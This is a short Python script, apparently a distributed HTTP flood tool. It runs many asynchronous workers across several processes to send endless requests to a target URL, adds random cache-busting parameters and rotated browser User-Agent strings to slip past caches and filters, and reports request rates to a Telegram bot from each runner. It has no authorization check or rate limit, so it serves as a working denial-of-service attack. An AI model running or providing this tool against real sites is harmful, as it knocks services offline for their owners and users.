import asyncio, os, random, string, sys, time, multiprocessing as mp
import aiohttp
from collections import Counter

TOKEN = os.environ["TG_TOKEN"]; CHAT = os.environ["TG_CHAT"]
URL, SECS, CONNS, MODE = sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), sys.argv[4].upper()
IDX = os.environ.get("RUNNER_IDX", "?")
PROCS = min(os.cpu_count() or 2, 4)
UAS = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121 Safari/537.36",
       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.2 Safari/605.1.15",
       "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120 Safari/537.36"]
def ua(): return random.choice(UAS)
def rand(n=8): return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))

def child(q, per):
    async def w(s, ev, loc):
        while not ev.is_set():
            sep = "&" if "?" in URL else "?"
            try:
                async with s.request(MODE, f"{URL}{sep}cb={rand()}", headers={"User-Agent": ua()},
                                     timeout=aiohttp.ClientTimeout(total=10)) as r:
                    loc[str(r.status)] += 1
            except asyncio.TimeoutError: loc["timeout"] += 1
            except Exception: loc["err"] += 1
    async def run():
        c = aiohttp.TCPConnector(limit=0, ssl=False, force_close=False)
        async with aiohttp.ClientSession(connector=c) as s:
            ev, loc = asyncio.Event(), Counter()
            ts = [asyncio.create_task(w(s, ev, loc)) for _ in range(per)]
            end = time.time() + SECS
            while time.time() < end:
                await asyncio.sleep(1)
                if loc: q.put(dict(loc)); loc.clear()
            ev.set(); await asyncio.gather(*ts, return_exceptions=True)
    asyncio.run(run())

if __name__ == "__main__":
    per = max(CONNS // PROCS, 1)
    q = mp.Queue(); ps = [mp.Process(target=child, args=(q, per)) for _ in range(PROCS)]
    for p in ps: p.start()
    tot = Counter()
    end = time.time() + SECS
    while time.time() < end:
        await_ = None
        while not q.empty(): tot.update(q.get())
        time.sleep(1)
    for p in ps: p.join(timeout=10); p.terminate()
    while not q.empty(): tot.update(q.get())
    ok = sum(v for k, v in tot.items() if k.isdigit())
    f5 = sum(v for k, v in tot.items() if k.isdigit() and k.startswith("5"))
    body = (f"runner {IDX}: {ok} ok / {f5} 5xx / {tot['timeout']} timeout / {tot['err']} err "
            f"= {ok/max(SECS,1):.0f} rps\n{URL}")
    import urllib.request, urllib.parse
    urllib.request.urlopen(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
        urllib.parse.urlencode({"chat_id": CHAT, "text": body}).encode(), timeout=20)
